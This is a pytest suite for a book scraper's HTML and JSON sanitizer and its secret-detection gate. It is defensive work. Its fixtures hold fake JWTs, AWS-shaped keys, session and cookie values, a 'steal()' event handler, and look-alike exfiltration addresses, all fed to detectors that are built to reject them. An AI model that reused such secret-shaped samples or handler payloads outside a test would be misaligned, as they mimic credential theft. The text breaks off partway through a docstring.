"""Unit tests for bookscraper.scraping.sanitize's pure sanitizers.

No mocks, no network, no browser: every function here transforms a string or a dict,
so each branch is pinned directly. These are the security boundary between hostile
captured markup and permanent public git history, so the suite also carries the
per-FIX assertions from the task-06.0 threat model (FIX-2..5).
"""

from __future__ import annotations

import json

import pytest

from bookscraper.scraping import sanitize
from bookscraper.scraping.parameters import site_constants
from bookscraper.scraping.sanitize import (
    EMAIL_PLACEHOLDER,
    PROSE_PLACEHOLDER,
    REDACTED_VALUE,
    SanitizationError,
    _Element,
    _element_siblings,
    _iter_elements,
    _parse,
    _select,
    _serialize,
    _split_group,
    _Text,
    _text_content,
    assert_clean,
    neutralize_prose,
    sanitize_html,
    sanitize_json,
    sanitize_ld_json,
    sanitize_text,
    shrink,
    strip_scripts_and_styles,
    strip_secrets,
    strip_tracking,
    strip_url_params,
)

# An AWS-access-key-shaped string, assembled at import time so no literal credential
# shape sits in the source (the secret-scan hook would otherwise block this file).
AWS_SHAPED = "AKIA" + "ABCDEFGHIJKLMNOP"


# --------------------------------------------------------------------------- #
# Spec-named tests
# --------------------------------------------------------------------------- #
def test_scripts_removed_but_ld_json_kept() -> None:
    """
    [Unit] sanitize: verifies strip_scripts_and_styles removes JS/CSS/noscript/iframe but keeps ld+json.

    Scenario:
        Given HTML with a plain script, an ld+json script, a style block, a noscript element, and an iframe.
        When strip_scripts_and_styles is called.
        Then tracking scripts, styles, noscript, and iframe are removed; the ld+json block survives verbatim.

    Boundaries:
        - Only ``type="application/ld+json"`` scripts are kept; all others (including plain scripts) are removed.

    On failure, first check:
        - A non-metadata script leaking into a fixture means the strip-scripts rule was loosened.
    """
    html = (
        "<html><head>"
        "<script>window.x=1</script>"
        '<script type="application/ld+json">{"@type":"Book"}</script>'
        "<style>.a{color:red}</style><noscript>x</noscript>"
        "<iframe src='http://ads'></iframe>"
        "</head><body><h1>T</h1></body></html>"
    )
    out = strip_scripts_and_styles(html)
    assert "window.x" not in out
    assert "color:red" not in out
    assert "<noscript>" not in out
    assert "<iframe" not in out
    assert 'type="application/ld+json"' in out
    assert '{"@type":"Book"}' in out


def test_inline_event_handlers_removed() -> None:
    """
    [Unit] sanitize: verifies strip_scripts_and_styles strips all inline event handlers.

    Scenario:
        Given an anchor tag with onclick, onmouseover, href, and id attributes.
        When strip_scripts_and_styles is called.
        Then all on* handlers are removed and href/id are preserved.

    Boundaries:
        - Every ``on*`` attribute is stripped regardless of event name; non-event attributes stay.

    On failure, first check:
        - Executable handlers riding into a fixture indicate the on* strip pattern changed.
    """
    out = strip_scripts_and_styles('<a href="/x" onclick="steal()" onmouseover="y()" id="k">L</a>')
    assert "onclick" not in out
    assert "onmouseover" not in out
    assert 'href="/x"' in out
    assert 'id="k"' in out


def test_tracking_query_params_stripped_from_links() -> None:
    """
    [Unit] sanitize: verifies strip_tracking removes known tracking query params from href URLs.

    Scenario:
        Given a link carrying ref, tag, pd_rd_i, qid, and a non-tracking keep param.
        When strip_tracking is called.
        Then tracking params are removed and the host, path, and keep param remain unchanged.

    Boundaries:
        - Host and path are untouched; only the known tracking param names drop.

    On failure, first check:
        - Tracking identifiers persisting in committed markup indicate the param blocklist needs updating.
    """
    out = strip_tracking('<a href="https://x.test/dp/1?ref=abc&tag=aff&pd_rd_i=9&qid=1&keep=yes">L</a>')
    assert "ref=abc" not in out
    assert "tag=aff" not in out
    assert "pd_rd_i" not in out
    assert "qid=1" not in out
    assert out == '<a href="https://x.test/dp/1?keep=yes">L</a>'


def test_hidden_input_values_and_csrf_meta_removed() -> None:
    """
    [Unit] sanitize: verifies strip_secrets removes CSRF meta tags and blanks hidden input values.

    Scenario:
        Given a page with a csrf-token meta, a viewport meta, a hidden authenticity_token input, and a text input.
        When strip_secrets is called.
        Then the csrf-token meta and its value are gone; the viewport meta survives; the hidden input
        keeps its element but its value is blank; the text input value is unchanged.

    Boundaries:
        - Hidden input elements are kept with ``value=""``, not removed entirely.

    On failure, first check:
        - A live token being committed indicates the CSRF-meta or hidden-input strip rule regressed.
    """
    html = (
        '<meta name="csrf-token" content="tok-123456">'
        '<meta name="viewport" content="width=1">'
        '<input type="hidden" name="authenticity_token" value="deadbeefdeadbeef">'
        '<input type="text" value="visible">'
    )
    out = strip_secrets(html)
    assert "tok-123456" not in out
    assert "csrf-token" not in out
    assert 'name="viewport"' in out
    assert "deadbeefdeadbeef" not in out
    # the hidden input element is kept, only blanked
    assert 'type="hidden"' in out
    assert 'value=""' in out
    assert 'value="visible"' in out


def test_emails_replaced_with_invalid_domain() -> None:
    """
    [Unit] sanitize: verifies strip_secrets replaces email addresses with the reserved-domain placeholder.

    Scenario:
        Given HTML containing an email address with a real domain.
        When strip_secrets is called.
        Then the original address is gone and EMAIL_PLACEHOLDER appears in its place.

    Boundaries:
        - Every matching email becomes the exact EMAIL_PLACEHOLDER constant.

    On failure, first check:
        - A real address persisting in committed markup indicates the email-rewrite regex regressed.
    """
    out = strip_secrets("<p>Contact jane.doe@corp.example-real.com now</p>")
    assert "jane.doe@corp" not in out
    assert EMAIL_PLACEHOLDER in out


def test_shrink_keeps_subtrees_containing_selectors() -> None:
    """
    [Unit] sanitize: verifies shrink retains subtrees matched by a keep-selector and drops unmatched siblings.

    Scenario:
        Given an HTML tree where one div matches the keep-selector and a large 800-char sibling div does not.
        When shrink is called with that selector.
        Then the matching subtree survives and the large unmatched sibling is dropped.

    Boundaries:
        - Only the subtree containing a match for the keep-selector survives; oversized unrelated siblings are dropped.

    On failure, first check:
        - Fixtures blowing the size budget indicate shrink is retaining unmatched subtrees.
    """
    filler = "x" * 800
    html = f'<div id="keep"><span class="isbn">978-1</span></div><div id="reviews">{filler}</div>'
    out = shrink(html, ["#keep .isbn"])
    assert "978-1" in out
    assert 'id="keep"' in out
    assert filler not in out


def test_sanitize_json_redacts_sensitive_keys() -> None:
    """
    [Unit] sanitize: verifies sanitize_json redacts sensitive keys and cleans prose, emails, and URLs.

    Scenario:
        Given a dict with a plain field, an access_token, session_id, email, long prose, a numeric price,
        and a signed URL.
        When sanitize_json is called.
        Then sensitive keys are REDACTED_VALUE, prose is PROSE_PLACEHOLDER, URLs are cleaned, and plain/numeric
        values pass through.

    Boundaries:
        - Sensitive keys redact; prose keys collapse; tracking URL params are stripped; other values are unchanged.

    On failure, first check:
        - Secrets surviving inside a JSON fixture indicate a key-name or URL-param rule was dropped.
    """
    obj = {
        "title": "Python",
        "access_token": "super-secret-value",
        "session_id": "abc123",
        "contact_email": "a@b.example-real.com",
        "about": "y" * 300,
        "price": 42,
        "image": "https://cdn.test/i.png?X-Amz-Signature=deadbeef&keep=1",
    }
    out = sanitize_json(obj)
    assert out["title"] == "Python"
    assert out["access_token"] == REDACTED_VALUE
    assert out["session_id"] == REDACTED_VALUE
    assert out["contact_email"] == REDACTED_VALUE
    assert out["about"] == PROSE_PLACEHOLDER
    assert out["price"] == 42
    assert "X-Amz-Signature" not in out["image"]
    assert "keep=1" in out["image"]


def test_assert_clean_rejects_known_secret_patterns() -> None:
    """
    [Unit] sanitize: verifies assert_clean raises on a string containing an AWS-key-shaped credential.

    Scenario:
        Given a string containing an AWS-access-key-shaped token embedded in text.
        When assert_clean is called.
        Then SanitizationError is raised.

    Boundaries:
        - Covers the vendor credential catalog; extended detectors are covered by subsequent FIX-2 tests.

    On failure, first check:
        - A passing call means assert_clean's credential-catalog detector was weakened.
    """
    with pytest.raises(SanitizationError):
        assert_clean(f"here is a key {AWS_SHAPED} in the page")


# --------------------------------------------------------------------------- #
# FIX-2 - assert_clean is extended and fail-closed
# --------------------------------------------------------------------------- #
def test_assert_clean_rejects_jwt() -> None:
    """
    [Unit] sanitize: verifies assert_clean (FIX-2) raises on a bearer JWT that is not a vendor credential.

    Scenario:
        Given a string with a three-part dot-separated base64url bearer token.
        When assert_clean is called.
        Then SanitizationError is raised.

    Boundaries:
        - FIX-2 extended detector: JWT pattern, not the vendor catalog.

    On failure, first check:
        - A passing call means the JWT pattern in the FIX-2 extended detectors was removed or narrowed.
    """
    with pytest.raises(SanitizationError):
        assert_clean("Authorization Bearer eyJhbGciOiJIUzI1.eyJzdWIiOiIxMjM0.SflKxwRJSMeKKF")


def test_assert_clean_rejects_aws_shaped_key() -> None:
    """
    [Unit] sanitize: verifies assert_clean (FIX-2) raises on an AWS-access-key-shaped string.

    Scenario:
        Given a string containing an AKIA-prefixed 20-character key.
        When assert_clean is called.
        Then SanitizationError is raised.

    Boundaries:
        - FIX-2 extended detector: AWS key shape (AKIA prefix).

    On failure, first check:
        - A passing call means the AWS-shape detector in the FIX-2 extended set was weakened.
    """
    with pytest.raises(SanitizationError):
        assert_clean(f"cred {AWS_SHAPED} end")


def test_assert_clean_rejects_cookie_header() -> None:
    """
    [Unit] sanitize: verifies assert_clean (FIX-2) raises on a Set-Cookie header echo in markup.

    Scenario:
        Given a string containing a Set-Cookie header echo with a session value.
        When assert_clean is called.
        Then SanitizationError is raised.

    Boundaries:
        - FIX-2 extended detector: Set-Cookie header pattern.

    On failure, first check:
        - A passing call means the cookie-header detector in FIX-2 was removed.
    """
    with pytest.raises(SanitizationError):
        assert_clean("Set-Cookie: at-main=abcd")


def test_assert_clean_rejects_email() -> None:
    """
    [Unit] sanitize: verifies assert_clean (FIX-2) raises on a raw email that the vendor catalog would miss.

    Scenario:
        Given a string containing a plain email address with a real domain.
        When assert_clean is called.
        Then SanitizationError is raised.

    Boundaries:
        - FIX-2 extended detector: email pattern independent of the vendor credential catalog.

    On failure, first check:
        - A passing call means the email detector in FIX-2 was weakened or exempt domains widened.
    """
    with pytest.raises(SanitizationError):
        assert_clean("mailto jane@corp-real.net")


def test_assert_clean_rejects_session_token_value() -> None:
    """
    [Unit] sanitize: verifies assert_clean (FIX-2) raises on a session-id key=value assignment.

    Scenario:
        Given a string containing a session-id=<value> assignment.
        When assert_clean is called.
        Then SanitizationError is raised.

    Boundaries:
        - FIX-2 extended detector: session-id key=value pattern.

    On failure, first check:
        - A passing call means the session-id pattern in FIX-2 was dropped or narrowed.
    """
    with pytest.raises(SanitizationError):
        assert_clean("session-id=176-9999999-0000000")


def test_assert_clean_passes_clean_and_placeholder_values() -> None:
    """
    [Unit] sanitize: verifies assert_clean (FIX-2/V-1) accepts clean text and the sanitizer's own placeholder values.

    Scenario:
        Given clean book copy text, and strings containing REDACTED_VALUE, EMAIL_PLACEHOLDER, and PROSE_PLACEHOLDER.
        When assert_clean is called on each.
        Then no SanitizationError is raised for any input.

    Boundaries:
        - Only exact emitted placeholder constants are exempt; arbitrary REDACTED-prefixed strings are not (see R-1).

    On failure, first check:
        - A raised exception means a placeholder constant was changed and assert_clean was not updated to match.
    """
    assert_clean("<p>Just some ordinary book copy.</p>")
    # The sanitizer's own redaction/placeholder markers are recognised precisely.
    assert_clean(f'"access_token": "{REDACTED_VALUE}"')
    assert_clean(f'"contact": "{EMAIL_PLACEHOLDER}"')
    assert_clean(f'"about": "{PROSE_PLACEHOLDER}"')


def test_assert_clean_v1_does_not_allowlist_words_on_the_line() -> None:
    """
    [Unit] sanitize: verifies assert_clean (V-1) does not disable the gate when a common word appears on the same line.

    Scenario:
        Given a line containing 'Latest' or 'test' plus a live session-id or AWS-shaped secret.
        When assert_clean is called.
        Then SanitizationError is raised regardless of the common word.

    Boundaries:
        - Substring allowlisting is gone; only exact emitted placeholders skip the gate (V-1 [HIGH]).

    On failure, first check:
        - A passing call means the FIX-2 backstop silently switches off on a huge share of real lines.
    """
    with pytest.raises(SanitizationError):
        assert_clean('<a href="/latest">Latest</a> session-id=176-1234567-8901234')
    with pytest.raises(SanitizationError):
        assert_clean(f"our test build key {AWS_SHAPED} deploy")


def test_assert_clean_r1_exempts_only_exact_placeholder_values() -> None:
    """
    [Unit] sanitize: verifies assert_clean (R-1) exempts only exact placeholder values, not REDACTED-prefixed strings.

    Scenario:
        Given a token = "[REDACTED]" (exact placeholder), a token prefixed with 'REDACTED', and an angle-wrapped value.
        When assert_clean is called on each.
        Then only the exact placeholder passes; the REDACTED-prefixed and angle-wrapped values raise (R-1 [MEDIUM]).

    Boundaries:
        - Only an exact emitted placeholder value ('[REDACTED]') is exempt; similar-looking values are not.

    On failure, first check:
        - A passing call on a non-exact value means the FIX-2 backstop can be tricked into ignoring a real secret.
    """
    # Values assembled here (not as a literal key="value") so secret-scan ignores them.
    redacted_prefixed = "REDACTED" + "aKq9zLp2rX7vN4bC8dF1"  # dummy opaque value
    angle_wrapped = "<" + "aKq9zLp2rX7vN4bC8dF1gH" + ">"  # dummy opaque value
    assert_clean('token = "[REDACTED]"')
    with pytest.raises(SanitizationError):
        assert_clean('token = "%s"' % redacted_prefixed)
    with pytest.raises(SanitizationError):
        assert_clean('password = "%s"' % angle_wrapped)


def test_assert_clean_v4_catches_secret_split_across_sibling_nodes() -> None:
    """
    [Unit] sanitize: verifies assert_clean (V-4) catches a JWT or email split across sibling DOM text nodes.

    Scenario:
        Given HTML where a JWT is split across three sibling spans, and separately where an email is split at '@'.
        When sanitize_html then assert_clean are called.
        Then SanitizationError is raised in both cases (V-4 [MEDIUM]).

    Boundaries:
        - assert_clean scans the concatenated tree text, not only the serialized bytes.

    On failure, first check:
        - A passing call means a split secret can ride through the final gate into git.
    """
    jwt = sanitize_html("<div><span>eyJhbGciOiJI</span><span>.eyJzdWIi</span><span>.SflKxwRJSMe</span></div>")
    with pytest.raises(SanitizationError):
        assert_clean(jwt)
    email = sanitize_html("<p>jane<span>@</span>corp-real.com</p>")
    with pytest.raises(SanitizationError):
        assert_clean(email)


def test_assert_clean_email_placeholder_is_not_flagged() -> None:
    """
    [Unit] sanitize: verifies assert_clean accepts the reserved-domain email placeholder but rejects a real address.

    Scenario:
        Given a string with EMAIL_PLACEHOLDER and separately a string with a real email address.
        When assert_clean is called on each.
        Then the placeholder passes and the real address raises SanitizationError.

    Boundaries:
        - Only the exact EMAIL_PLACEHOLDER constant is exempt; real domain addresses always raise.

    On failure, first check:
        - EMAIL_PLACEHOLDER changed but assert_clean's exemption list was not updated.
    """
    assert_clean(f"contact {EMAIL_PLACEHOLDER}")
    with pytest.raises(SanitizationError):
        assert_clean("contact jane@corp-real.com")


def test_assert_clean_r3_catches_whitespace_split_token() -> None:
    """
    [Unit] sanitize: verifies assert_clean (R-3) catches a JWT split by whitespace or zero-width separators.

    Scenario:
        Given a JWT split by a space, a U+2028 line separator, and a U+200B zero-width space in separate inputs.
        When assert_clean is called on each.
        Then SanitizationError is raised for all three (R-3 [MEDIUM]).

    Boundaries:
        - assert_clean also scans a fully whitespace-stripped view of the text to catch these splits.

    On failure, first check:
        - A passing call means an invisible-separator split can smuggle a token past the backstop.
    """
    jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4"
    for sep in (" ", "\u2028", "\u200b"):
        with pytest.raises(SanitizationError):
            assert_clean(f"<div>{jwt[:40]}{sep}{jwt[40:]}</div>")


def test_assert_clean_r4_example_domain_exemption_is_exact() -> None:
    """
    [Unit] sanitize: verifies assert_clean (R-4) exempts only exact RFC-2606 reserved email domains.

    Scenario:
        Given an email at '@example.org' (exempt), and emails at '@evilexample.com' and '@myexample.net' (not exempt).
        When assert_clean is called on each.
        Then the exact reserved domain passes and the look-alike domains raise SanitizationError (R-4 [LOW]).

    Boundaries:
        - '@example.com', '@example.org', '@example.net' (full domain) are exempt; look-alike domains are not.

    On failure, first check:
        - A passing call on a look-alike domain means the email backstop was weakened by a substring match.
    """
    assert_clean("contact user@example.org")
    with pytest.raises(SanitizationError):
        assert_clean("contact steal@evilexample.com")
    with pytest.raises(SanitizationError):
        assert_clean("reach exfil@myexample.net")


def test_r4_retina_and_image_filenames_are_not_rewritten() -> None:
    """
    [Unit] sanitize: verifies strip_secrets (R-4) does not rewrite retina image filenames as emails.

    Scenario:
        Given markup with 'sprite@2x.png' and 'hero@3x.jpg' retina asset names.
        When strip_secrets is called.
        Then the image filenames are unchanged and EMAIL_PLACEHOLDER is absent; a genuine email on the same
        page is still rewritten.

    Boundaries:
        - _replace_emails leaves image filenames (e.g. @2x.png, @3x.jpg) intact; real emails still rewrite (R-4 [LOW]).

    On failure, first check:
        - Corrupted filenames in committed fixtures indicate the email regex is too broad.
    """
    out = strip_secrets('<img src="https://images.test/sprite@2x.png"><p>hero@3x.jpg</p>')
    assert "sprite@2x.png" in out
    assert "hero@3x.jpg" in out
    assert EMAIL_PLACEHOLDER not in out
    # A genuine email on the same shape of page is still rewritten.
    assert EMAIL_PLACEHOLDER in strip_secrets("<p>jane@corp-real.com</p>")


def test_assert_clean_no_false_positive_on_benign_book_text() -> None:
    """
    [Unit] sanitize: verifies assert_clean raises no false positive on benign book page text (R-3 guard).

    Scenario:
        Given strings with ISBNs, prices, ASINs, long numeric order ids, base64-ish cover ids, and retina filenames.
        When assert_clean is called on each.
        Then no SanitizationError is raised for any of these benign strings.

    Boundaries:
        - None of the detectors (including the whitespace-stripped scan) should fire on realistic book-page text.

    On failure, first check:
        - A raised exception means a benign pattern was incorrectly added to the secret-detector set.
    """
    benign = [
        "ISBN-13: 978-1-492-05635-5 and ISBN-10 1492056359",
        "Price $42.99 | ASIN B09ABCDEF1 | 1,234,567 ratings",
        "order 176099999900000012345 processed",
        "cover id 81aBcDeFgHiJkLmNoPqRsTuVwXyZ0123456789 shown",
        "the AIzaWords chapter covers azimuth in 35 pages roughly here now",
    ]
    for text in benign:
        assert_clean(text)
    assert_clean(sanitize_html('<img src="https://images.test/sprite@2x.png">'))


def test_assert_clean_rejects_non_string() -> None:
    """
    [Unit] sanitize: verifies assert_clean (FIX-2) raises SanitizationError on a non-string payload.

    Scenario:
        Given a bytes object passed to assert_clean.
        When assert_clean is called.
        Then SanitizationError is raised (fail-closed, not a silent pass).

    Boundaries:
        - Any non-string type raises; this prevents accidental bypass by passing wrong type.

    On failure, first check:
        - A passing call means assert_clean silently accepts non-string input, defeating the gate.
    """
    with pytest.raises(SanitizationError):
        assert_clean(b"bytes")  # type: ignore[arg-type]


# --------------------------------------------------------------------------- #
# FIX-3 - sensitive data-* stripped whatever their length
# --------------------------------------------------------------------------- #
def test_strip_secrets_removes_short_sensitive_data_attrs() -> None:
    """
    [Unit] sanitize: verifies strip_secrets (FIX-3) strips short session/ubid/customer/csm data-* attributes.

    Scenario:
        Given an element with data-session-id, data-ubid-acbca, data-customer, data-csm, data-safe, and data-note attrs.
        When strip_secrets is called.
        Then the sensitive-named data-* attrs are removed; data-safe and data-note survive.

    Boundaries:
        - Sensitive-named data-* attrs are dropped by name regardless of their value length (FIX-3).

    On failure, first check:
        - A surviving sensitive attr means the name blocklist in strip_secrets was narrowed.
    """
    html = (
        '<div data-session-id="s1" data-ubid-acbca="u2" data-customer="c3" '
        'data-csm="m4" data-safe="short" data-note="ok">x</div>'
    )
    out = strip_secrets(html)
    assert "data-session-id" not in out
    assert "data-ubid" not in out
    assert "data-customer" not in out
    assert "data-csm=" not in out
    assert 'data-safe="short"' in out
    assert 'data-note="ok"' in out


def test_strip_secrets_removes_long_opaque_data_attr() -> None:
    """
    [Unit] sanitize: verifies strip_secrets (FIX-3) drops any data-* attribute whose value exceeds 200 chars.

    Scenario:
        Given an element with a data-blob attribute whose value is 250 chars and a data-keep with a short value.
        When strip_secrets is called.
        Then the long opaque data-blob is removed and data-keep survives.

    Boundaries:
        - The length threshold is 200 chars; the attribute name does not matter for the length gate (FIX-3).

    On failure, first check:
        - A surviving long attr means the length threshold in strip_secrets was raised or removed.
    """
    blob = "a" * 250
    out = strip_secrets(f'<div data-blob="{blob}" data-keep="v">x</div>')
    assert blob not in out
    assert 'data-keep="v"' in out


def test_strip_secrets_drops_amazon_correlation_data_attrs() -> None:
    """
    [Unit] sanitize: verifies strip_secrets (CL-1) drops data-uuid and data-csa-c-* correlation attrs by name.

    Scenario:
        Given an element with data-asin, data-uuid, data-csa-c-id, data-csa-c-type, and data-component-type.
        When strip_secrets is called.
        Then data-uuid and data-csa-c-* are removed; data-asin and data-component-type survive.

    Boundaries:
        - CL-1: data-uuid/data-csa-c-* are short (<200ch) so they bypass the length gate; the explicit
          correlation rule drops them. data-asin (SEARCH_ASIN_ATTRIBUTE) must survive for the search parser.

    On failure, first check:
        - A surviving correlation attr means the CL-1 explicit name rule was removed or narrowed.
    """
    html = (
        '<div data-asin="1098131029" data-uuid="01122864-fd2d-49c6-9c2e-3b4c5d6e7f80" '
        'data-csa-c-id="173qnz-ujifa9-w6adqd-htngc3" data-csa-c-type="item" '
        'data-component-type="s-search-result">x</div>'
    )
    out = strip_secrets(html)
    assert "data-uuid" not in out
    assert "data-csa-c-id" not in out
    assert "data-csa-c-type" not in out
    assert 'data-asin="1098131029"' in out
    assert 'data-component-type="s-search-result"' in out


# --------------------------------------------------------------------------- #
# FIX-4 - ld+json parsed and sanitized; other inline JSON removed
# --------------------------------------------------------------------------- #
def test_sanitize_ld_json_sanitizes_and_reembeds() -> None:
    """
    [Unit] sanitize: verifies sanitize_ld_json (FIX-4) parses, sanitizes, and re-embeds an ld+json blob.

    Scenario:
        Given an ld+json script with an email, a long description, and a signed image URL.
        When sanitize_ld_json is called.
        Then the email and long description are replaced by placeholders, the signed param is stripped,
        and the name field is preserved in the re-embedded JSON.

    Boundaries:
        - FIX-4: the ld+json blob is not passed through verbatim; it is parsed and sanitized first.

    On failure, first check:
        - A surviving email or signed URL means ld+json blobs are being passed through verbatim.
    """
    blob = {
        "@type": "Book",
        "name": "Python",
        "authorEmail": "author@corp-real.com",
        "description": "z" * 300,
        "image": "https://cdn.test/x.png?X-Amz-Signature=abc",
    }
    html = f'<script type="application/ld+json">{json.dumps(blob)}</script>'
    out = sanitize_ld_json(html)
    assert "author@corp-real.com" not in out
    assert "z" * 300 not in out
    assert PROSE_PLACEHOLDER in out
    assert "X-Amz-Signature" not in out
    assert '"name": "Python"' in out or '"name":"Python"' in out


def test_sanitize_ld_json_drops_unparseable_blob() -> None:
    """
    [Unit] sanitize: verifies sanitize_ld_json (FIX-4) empties an ld+json blob that cannot be parsed as JSON.

    Scenario:
        Given an ld+json script tag containing invalid JSON.
        When sanitize_ld_json is called.
        Then the unparseable content is removed; the script tag element itself remains.

    Boundaries:
        - Fail-safe: unparseable blobs are emptied rather than passed through or raised on (FIX-4).

    On failure, first check:
        - Unparseable JSON surviving means the fail-safe empty-on-parse-error path was removed.
    """
    html = '<script type="application/ld+json">not json {{{</script>'
    out = sanitize_ld_json(html)
    assert "not json" not in out
    assert 'type="application/ld+json"' in out


def test_non_ld_json_state_blob_removed() -> None:
    """
    [Unit] sanitize: verifies strip_scripts_and_styles (FIX-4) removes an inline __INITIAL_STATE__ script.

    Scenario:
        Given HTML with a script containing window.__INITIAL_STATE__ and a following h1.
        When strip_scripts_and_styles is called.
        Then the __INITIAL_STATE__ script is gone and the h1 content is preserved.

    Boundaries:
        - Any non-ld+json script is removed; surrounding structural HTML is unchanged (FIX-4).

    On failure, first check:
        - __INITIAL_STATE__ surviving means the script-removal rule now exempts state-blobs.
    """
    html = '<script>window.__INITIAL_STATE__={"session":"tok"}</script><h1>T</h1>'
    out = strip_scripts_and_styles(html)
    assert "__INITIAL_STATE__" not in out
    assert "<h1>T</h1>" in out


# --------------------------------------------------------------------------- #
# FIX-5 - signed-URL and session params stripped across attributes and ld+json
# --------------------------------------------------------------------------- #
def test_strip_url_params_removes_signed_and_session_params() -> None:
    """
    [Unit] sanitize: verifies strip_url_params (FIX-5) removes AWS/CloudFront signed and session params.

    Scenario:
        Given a URL with X-Amz-Signature, X-Amz-Credential, Signature, Key-Pair-Id, Policy, session-id,
        sid, smid, csm-hit, and a benign w=640 param.
        When strip_url_params is called.
        Then all signed and session params are gone and w=640 survives.

    Boundaries:
        - FIX-5: the full set of AWS and CloudFront signing params plus session hints are stripped.

    On failure, first check:
        - A surviving signed param means the param blocklist in strip_url_params was narrowed.
    """
    url = (
        "https://cdn.test/i.jpg?X-Amz-Signature=sig&X-Amz-Credential=cred"
        "&Signature=cf&Key-Pair-Id=kp&Policy=pol&session-id=ses&sid=x&smid=y&csm-hit=z&w=640"
    )
    out = strip_url_params(url)
    for gone in (
        "X-Amz-Signature",
        "X-Amz-Credential",
        "Signature",
        "Key-Pair-Id",
        "Policy",
        "session-id",
        "sid=",
        "smid=",
        "csm-hit",
    ):
        assert gone not in out
    assert "w=640" in out


def test_strip_tracking_cleans_srcset_and_action() -> None:
    """
    [Unit] sanitize: verifies strip_tracking (FIX-5) strips params from srcset candidates and form action.

    Scenario:
        Given an img with a srcset carrying X-Amz-Signature on one candidate and a form action with session-id.
        When strip_tracking is called.
        Then X-Amz-Signature and session-id are gone; the benign w=2 and keep=1 params survive.

    Boundaries:
        - FIX-5: param stripping applies across all URL-bearing attributes including srcset and action.

    On failure, first check:
        - Surviving signed params in a srcset mean strip_tracking only cleaned href/src attributes.
    """
    html = (
        '<img srcset="https://cdn.test/a.jpg?X-Amz-Signature=s 1x, https://cdn.test/b.jpg?w=2 2x">'
        '<form action="https://x.test/go?session-id=abc&keep=1"></form>'
    )
    out = strip_tracking(html)
    assert "X-Amz-Signature" not in out
    assert "session-id" not in out
    assert "w=2" in out
    assert "keep=1" in out


def test_strip_url_params_passthrough_and_empty_query() -> None:
    """
    [Unit] sanitize: verifies strip_url_params returns URLs with no query or empty query unchanged.

    Scenario:
        Given a URL with no query string and a URL with an empty query string.
        When strip_url_params is called on each.
        Then each is returned exactly as passed in.

    Boundaries:
        - No-query and empty-query URLs are edge cases that should not be modified.

    On failure, first check:
        - A modified URL means strip_url_params alters the path or appends/removes a '?' unnecessarily.
    """
    assert strip_url_params("https://x.test/path") == "https://x.test/path"
    assert strip_url_params("https://x.test/path?") == "https://x.test/path?"


def test_amazon_search_href_token_params_stripped() -> None:
    """
    [Unit] sanitize: verifies strip_url_params removes dib/dib_tag JWT tokens from Amazon search hrefs.

    Scenario:
        Given an Amazon search-result href with a JWT-shaped dib token, dib_tag, qid, sr, and keywords params.
        When strip_url_params is called.
        Then dib and dib_tag are removed; keywords survives; the /dp/<ASIN>/ path is unchanged; the result
        passes assert_clean.

    Boundaries:
        - Scheme, host, and path (the /dp/<ASIN> detail path the parser reads) stay; only non-sensitive params remain.

    On failure, first check:
        - A leaking dib token means strip_url_params does not strip JWT-shaped values or the dib param name.
    """
    jwt = "eyJhbGciOiJIUzI1NiJ9.eyJ2IjoiMSIsInAiOiJzZWFyY2gifQ.Sf1KxwRJSMeKKF2QT4abcd"
    href = f"/Some-Title/dp/B0ABCDEFGH/ref=sr_1_1?dib={jwt}&dib_tag=se&qid=123&sr=8-1&keywords=python"
    out = strip_url_params(href)
    assert out == "/Some-Title/dp/B0ABCDEFGH/ref=sr_1_1?keywords=python"
    assert "dib" not in out
    assert jwt not in out
    assert "/dp/B0ABCDEFGH/" in out
    assert_clean(out)


def test_strip_url_params_drops_opaque_token_value_any_name() -> None:
    """
    [Unit] sanitize: verifies strip_url_params drops opaque mixed-class token values regardless of param name.

    Scenario:
        Given a URL with an 18-char mixed-class opaque token under param 'blob', and benign params foo, n, kw.
        When strip_url_params is called.
        Then the opaque token and its param name are removed; the benign short/single-class params survive.

    Boundaries:
        - Mixed-class opaque values are dropped regardless of param name; short or single-class values are kept.

    On failure, first check:
        - A surviving opaque token means the token-value detector was narrowed or removed.
    """
    opaque = "A1b2C3d4E5f6G7h8X9"  # 18 chars, mixed classes
    out = strip_url_params(f"https://x.test/p?blob={opaque}&foo=abc&n=12345&kw=python")
    assert opaque not in out
    assert "blob=" not in out
    assert "foo=abc" in out  # short value, unknown name -> kept
    assert "n=12345" in out  # single class (digits) -> kept
    assert "kw=python" in out  # single class (lower) -> kept


def test_strip_tracking_strips_dib_in_href() -> None:
    """
    [Unit] sanitize: verifies strip_tracking removes dib/dib_tag JWT tokens from anchor href attributes.

    Scenario:
        Given an anchor tag whose href carries a JWT-shaped dib token, dib_tag, and a benign k=v param.
        When strip_tracking is called.
        Then dib and dib_tag are removed; k=v and the /dp/B0X/ path survive.

    Boundaries:
        - dib/dib_tag stripping applies through the href attribute path in strip_tracking, not only strip_url_params.

    On failure, first check:
        - A surviving dib token means strip_tracking does not clean href attributes.
    """
    jwt = "eyJhbGciOiJIUzI1NiJ9.eyJhIjoiYiJ9.Sf1KxwRJSMeKKF2QT4abcd"
    out = strip_tracking(f'<a href="https://www.amazon.com/dp/B0X/ref=x?dib={jwt}&dib_tag=se&k=v">L</a>')
    assert jwt not in out
    assert "dib" not in out
    assert "k=v" in out
    assert "/dp/B0X/" in out


def test_strip_url_params_unparseable_returns_input(monkeypatch: pytest.MonkeyPatch) -> None:
    """
    [Local] sanitize: verifies strip_url_params returns the original URL unchanged when urlsplit raises.

    Scenario:
        Given urlsplit is patched to raise ValueError on any input.
        When strip_url_params is called with a URL.
        Then the original URL string is returned unchanged (best-effort).

    Boundaries:
        - The best-effort contract: a parse failure never raises, it returns the input as-is.

    On failure, first check:
        - A raised exception means strip_url_params no longer catches urlsplit failures gracefully.
    """

    def _boom(_: str) -> None:
        """Raise unconditionally to simulate a urlsplit parse failure."""
        raise ValueError("bad url")

    monkeypatch.setattr(sanitize, "urlsplit", _boom)
    assert strip_url_params("https://x.test/p?a=b") == "https://x.test/p?a=b"


def test_strip_tracking_removes_tracker_beacon_and_keeps_content_img() -> None:
    """
    [Unit] sanitize: verifies strip_tracking removes tracker beacon img/link elements but keeps content images.

    Scenario:
        Given HTML with a google-analytics img beacon, a doubleclick link, a content img, and a span.
        When strip_tracking is called.
        Then the tracker beacon and doubleclick link are removed; the content image and span text survive.

    Boundaries:
        - Tracker domains (google-analytics, doubleclick, etc.) trigger element removal; content CDN hosts do not.

    On failure, first check:
